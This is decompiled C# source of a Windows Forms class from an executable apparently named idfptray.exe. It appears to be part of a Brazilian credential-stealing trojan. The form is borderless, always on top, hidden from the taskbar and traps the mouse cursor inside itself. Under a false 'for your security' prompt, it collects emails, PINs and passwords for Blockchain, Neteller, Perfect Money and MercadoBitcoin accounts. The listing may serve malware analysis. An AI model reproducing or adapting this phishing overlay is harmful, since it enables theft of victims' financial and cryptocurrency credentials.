// Decompiled with JetBrains decompiler
// Type: Xpctra.FormMoedas
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace Xpctra
{
  public class FormMoedas : Form
  {
    private string Tipo = "";
    private int X = 0;
    private int Y = 0;
    private IContainer components = (IContainer) null;
    public int Pin4;
    public string Email;
    public string SenhaBlockchain;
    private Label label1;
    private Label labelErroMoeda;
    private Button button1;
    private MaskedTextBox maskedTextBoxPin;
    private Label Pin;
    private TextBox textBoxEmail;
    private Label label3;

    [DllImport("user32.dll")]
    public static extern bool SetForegroundWindow(IntPtr hWnd);

    public FormMoedas(string TipoMoeda)
    {
      this.Tipo = TipoMoeda;
      this.InitializeComponent();
      if (this.Tipo.Equals("Blockchain"))
      {
        this.label1.Text = "Para sua segurança, informe sua senha e seu e-mail cadastrado.";
        this.Pin.Text = "Senha";
        this.maskedTextBoxPin.Mask = "";
        this.button1.BackColor = Color.MediumTurquoise;
      }
      if (this.Tipo.Equals("Neteller"))
      {
        this.label1.Text = "Para sua segurança, informe seu pin de 6 digitos.";
        this.label3.Visible = false;
        this.textBoxEmail.Visible = false;
        this.Pin.Location = new Point(21, 71);
        this.maskedTextBoxPin.Location = new Point(24, 87);
        this.maskedTextBoxPin.Mask = "000000";
        this.button1.BackColor = Color.YellowGreen;
      }
      if (!this.Tipo.Equals("Perfect Money"))
        return;
      this.label1.Text = "Para sua segurança, informe seu e-mail cadastrado.";
      this.Pin.Visible = false;
      this.maskedTextBoxPin.Visible = false;
      this.button1.BackColor = Color.Brown;
    }

    private void FormMoedas_Load(object sender, EventArgs e)
    {
      this.maskedTextBoxPin.SelectionStart = 0;
      this.maskedTextBoxPin.Focus();
      Cursor.Clip = this.Bounds;
      this.TopMost = true;
    }

    private void button1_Click(object sender, EventArgs e)
    {
      if (this.Tipo.Equals("MercadoBiticoin"))
      {
        this.labelErroMoeda.Text = "";
        if (this.textBoxEmail != null && this.maskedTextBoxPin.Text != "" && this.maskedTextBoxPin.Text.Length == 4)
        {
          Match match = Regex.Match(this.textBoxEmail.Text, "([\\w-\\.]+)@((?:[\\w]+\\.)+)([a-zA-Z]{2,4})");
          if (match.Success)
          {
            this.Email = match.Value;
            if (!int.TryParse(this.maskedTextBoxPin.Text, out this.Pin4))
            {
              this.labelErroMoeda.Visible = true;
              this.labelErroMoeda.Text = "Pin Invalido";
              return;
            }
            this.Close();
          }
          else
          {
            this.labelErroMoeda.Visible = true;
            this.labelErroMoeda.Text = "E-mail Invalido";
            return;
          }
        }
        else
        {
          int num = (int) MessageBox.Show("Campo Invalido");
        }
      }
      if (this.Tipo.Equals("Blockchain") && (this.textBoxEmail != null && this.maskedTextBoxPin.Text != ""))
      {
        Match match = Regex.Match(this.textBoxEmail.Text, "([\\w-\\.]+)@((?:[\\w]+\\.)+)([a-zA-Z]{2,4})");
        if (match.Success)
        {
          this.Email = match.Value;
          this.SenhaBlockchain = this.maskedTextBoxPin.Text;
          this.Close();
        }
        else
        {
          this.labelErroMoeda.Visible = true;
          this.labelErroMoeda.Text = "E-mail Invalido";
          return;
        }
      }
      if (this.Tipo.Equals("Neteller"))
      {
        if (this.maskedTextBoxPin.Text.Length == 6)
        {
          if (!int.TryParse(this.maskedTextBoxPin.Text, out this.Pin4))
          {
            this.labelErroMoeda.Visible = true;
            this.labelErroMoeda.Text = "Pin Invalido";
            return;
          }
          this.Close();
        }
        else
        {
          this.labelErroMoeda.Visible = true;
          this.labelErroMoeda.Text = "Pin Invalido";
          return;
        }
      }
      if (!this.Tipo.Equals("Perfect Money"))
        return;
      if (this.textBoxEmail != null)
      {
        Match match = Regex.Match(this.textBoxEmail.Text, "([\\w-\\.]+)@((?:[\\w]+\\.)+)([a-zA-Z]{2,4})");
        if (match.Success)
        {
          this.Email = match.Value;
          this.Close();
        }
        else
        {
          this.labelErroMoeda.Visible = true;
          this.labelErroMoeda.Text = "E-mail Invalido";
        }
      }
      else
      {
        this.labelErroMoeda.Visible = true;
        this.labelErroMoeda.Text = "E-mail Invalido";
      }
    }

    private void maskedTextBoxPin_Click(object sender, EventArgs e)
    {
      if (this.maskedTextBoxPin.Text.Length == 0)
        this.maskedTextBoxPin.SelectionStart = 0;
      else
        this.maskedTextBoxPin.SelectionStart = this.maskedTextBoxPin.Text.Length;
    }

    private void FormMoedas_MouseMove(object sender, MouseEventArgs e)
    {
      Point position;
      if (Cursor.Position.X < this.Bounds.X + 50)
      {
        position = Cursor.Position;
        this.X = position.X + 20;
      }
      else
      {
        position = Cursor.Position;
        this.X = position.X - 20;
      }
      position = Cursor.Position;
      if (position.Y < this.Bounds.Y + 50)
      {
        position = Cursor.Position;
        this.Y = position.Y + 20;
      }
      else
      {
        position = Cursor.Position;
        this.Y = position.Y - 20;
      }
    }

    private void label3_Click(object sender, EventArgs e)
    {
    }

    private void FormMoedas_MouseEnter(object sender, EventArgs e)
    {
      Cursor.Clip = this.Bounds;
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.label1 = new Label();
      this.labelErroMoeda = new Label();
      this.button1 = new Button();
      this.maskedTextBoxPin = new MaskedTextBox();
      this.Pin = new Label();
      this.textBoxEmail = new TextBox();
      this.label3 = new Label();
      this.SuspendLayout();
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label1.Location = new Point(21, 33);
      this.label1.Name = "label1";
      this.label1.Size = new Size(397, 17);
      this.label1.TabIndex = 2;
      this.label1.Text = "Para sua segurança, informe seu pin e seu e-mail cadastrado";
      this.labelErroMoeda.AutoSize = true;
      this.labelErroMoeda.ForeColor = Color.Red;
      this.labelErroMoeda.Location = new Point(21, 213);
      this.labelErroMoeda.Name = "labelErroMoeda";
      this.labelErroMoeda.Size = new Size(11, 13);
      this.labelErroMoeda.TabIndex = 14;
      this.labelErroMoeda.Text = "*";
      this.labelErroMoeda.Visible = false;
      this.button1.BackColor = Color.FromArgb(65, 65, 65);
      this.button1.ForeColor = Color.White;
      this.button1.ImageAlign = ContentAlignment.MiddleLeft;
      this.button1.Location = new Point(24, 167);
      this.button1.Name = "button1";
      this.button1.Size = new Size(130, 32);
      this.button1.TabIndex = 3;
      this.button1.Text = "Confirmar";
      this.button1.UseVisualStyleBackColor = false;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.maskedTextBoxPin.Location = new Point(24, 134);
      this.maskedTextBoxPin.Mask = "0000";
      this.maskedTextBoxPin.Name = "maskedTextBoxPin";
      this.maskedTextBoxPin.PasswordChar = '*';
      this.maskedTextBoxPin.Size = new Size(90, 20);
      this.maskedTextBoxPin.TabIndex = 2;
      this.maskedTextBoxPin.Click += new EventHandler(this.maskedTextBoxPin_Click);
      this.Pin.AutoSize = true;
      this.Pin.Location = new Point(21, 118);
      this.Pin.Name = "Pin";
      this.Pin.Size = new Size(22, 13);
      this.Pin.TabIndex = 15;
      this.Pin.Text = "Pin";
      this.textBoxEmail.Location = new Point(24, 87);
      this.textBoxEmail.Name = "textBoxEmail";
      this.textBoxEmail.Size = new Size(156, 20);
      this.textBoxEmail.TabIndex = 1;
      this.label3.AutoSize = true;
      this.label3.Location = new Point(21, 71);
      this.label3.Name = "label3";
      this.label3.Size = new Size(35, 13);
      this.label3.TabIndex = 17;
      this.label3.Text = "E-mail";
      this.label3.Click += new EventHandler(this.label3_Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = SystemColors.ControlLightLight;
      this.ClientSize = new Size(440, 261);
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.textBoxEmail);
      this.Controls.Add((Control) this.Pin);
      this.Controls.Add((Control) this.labelErroMoeda);
      this.Controls.Add((Control) this.maskedTextBoxPin);
      this.Controls.Add((Control) this.button1);
      this.Controls.Add((Control) this.label1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (FormMoedas);
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = nameof (FormMoedas);
      this.TopMost = true;
      this.Load += new EventHandler(this.FormMoedas_Load);
      this.MouseEnter += new EventHandler(this.FormMoedas_MouseEnter);
      this.MouseMove += new MouseEventHandler(this.FormMoedas_MouseMove);
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
